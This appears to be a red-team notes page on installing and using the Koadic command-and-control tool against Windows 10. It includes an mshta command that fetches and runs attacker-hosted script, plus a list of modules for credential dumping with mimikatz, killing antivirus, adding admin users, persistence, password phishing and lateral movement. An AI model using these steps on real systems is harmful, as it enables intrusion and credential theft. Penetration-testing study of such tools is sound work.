# Post-Exploitation

[Home](README.md) 

<details>
<summary style="display: block; font-size: 1.5em; margin-top: 0.83em; margin-bottom: 0.83em; margin-left: 0; margin-right: 0; font-weight: bold;">Koadic</summary>

[Koadic Github](https://github.com/zerosum0x0/koadic)

Koadic is a post-exploitation tool used to harvest information, deliver malicious payloads, and pivot/propagate exploitation. It is a command and control utility that listens as a web server on a specified port for targets to register. Targets are called zombies, and the web server is called a stager. The red team member uses koadics implant modules to create jobs for zombies. The zombies collect and execute these jobs, returning data or confirming successful configuration changes.

## Install

Koadic is not included with Kali. You must install pre-requisites and clone the repository to get koadic.

1.	In Kali, open a terminal.
2.	Update the apt repository list

        sudo apt -y update

3.	Install Python 3.7 and PIP 3:

        sudo apt -y install python3.7 python3-pip
 
4.	Clone the repository using git:

        git clone [Koadic Github](https://github.com/zerosum0x0/koadic)
 
5.	Install koadic requirements from the requirements list:

        cd koadic
        sudo pip3 install -r requirements.txt
 
6.	Start Koadic:

        ./koadic
 
## Configure Stager and Register Zombie Windows 10 Machine

1.	Show and Set stager parameters:

        info
        set SRVPORT <desired port number>
        set ENDPOINT test (or desired endpoint name)
 
2.	Run the stager:

        run
 
Make note of the second returned line. This is what the target must run to register as a zombie of this stager.

3.	On a Windows 10 machine, open an admin powershell console window

4.	Run the mshta command with our new stager url (the one returned when we started the stager)

        mshta http://<ipaddress>:<port>/<endpointname>
 
5.	On Kali, show zombies list:

        zombies
 
## Use Implant Modules

Implants are python-based modules used to create jobs on the stager for zombies to run. You can create custom implants and add to your modules directory for extensibility.

To use an implant:

    use <implant path>

Set parameters if necessary:

    info
    set <parameter name> <parameter value>

Run the implant:

    run

## Notable Gather Modules

* Implant/gather/clipboard – collects current clipboard value for logged in user
* Implant/gather/enum_domain_info – collect verbose domain information
* Implant/gather/hashdump_sam – pulls account names with password hashes
* Implant/gather/loot_finder – looks for interesting/notable files

## Notable Inject Modules

* Implant/inject/mimikatz_dotnet2js – Runs mimikatz on the zombie to pull password hashes
    
        creds -a – shows a verbose output of returned mimikatz information

## Notable Manage Modules

* Implant/manage/exec_cmd – Runs given command on the zombie as a local command
* Implant/manage/killav – Kills some antivirus clients

## Notable Persist Modules

* Implant/persist/add_user – Adds a user with given username, password. Can also add the user as local administrator
* Implant/persist/schtasks – Create scheduled task on zombie. Can be used to run the mshta command every time the target starts
* Implant/persist/registry – Create/modify registry entries on zombie

## Other Notable Modules

* Implant/phish/password_box – Shows a dialog box prompting the user to enter a value. Default requests they enter a password
* Implant/pivot/exec_psexec – Runs remote command from the zombie against another device. Can be used to remote register other targets as zombies
* Implant/scan/tcp – Runs nmap-like scan to enumerate listening ports on a given target
* Implant/util/download_file – Downloads file from zombie to given local directory
* Implant/util/upload_file – Uploads file to zombie

This tool uses Jscript and VBScript to run these modules, so powershell is not a requirement for Koadic like other C2 tools. You can create your own python scripts to run as implants if there is something this tool is lacking. Koadic is a powerful post-exploitation utility and makes an excellent addition to any pen testing framework. 
</details>

<!-- <details>
<summary style="display: block; font-size: 1.5em; margin-top: 0.83em; margin-bottom: 0.83em; margin-left: 0; margin-right: 0; font-weight: bold;">Click to Expand</summary>



</details>

<details>
<summary style="display: block; font-size: 1.5em; margin-top: 0.83em; margin-bottom: 0.83em; margin-left: 0; margin-right: 0; font-weight: bold;">Click to Expand</summary>



</details>

<details>
<summary style="display: block; font-size: 1.5em; margin-top: 0.83em; margin-bottom: 0.83em; margin-left: 0; margin-right: 0; font-weight: bold;">Click to Expand</summary>



</details> -->